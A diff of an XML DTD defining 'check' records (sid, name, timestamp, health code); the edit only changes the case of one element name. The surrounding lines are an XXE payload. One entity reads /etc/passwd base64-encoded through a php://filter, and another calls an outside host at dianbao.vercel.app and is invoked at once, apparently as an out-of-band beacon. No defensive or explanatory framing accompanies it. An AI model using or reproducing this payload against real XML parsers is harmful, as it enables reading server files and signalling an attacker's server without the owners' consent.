@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ELEMENT check (sid,name,timestamp,healthcode)>
+<!ELEMENT check (sid,name,timestamp,healthCode)>
 <!ELEMENT sid (#PCDATA)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT timestamp (#PCDATA)>
-<!ELEMENT healthcode (#PCDATA)>
+<!ELEMENT healthCode (#PCDATA)>
 <!ENTITY % zfile SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % confirm1 SYSTEM "https://dianbao.vercel.app/send/3AD2781AD6E69/ESON_head">
 		%confirm1;
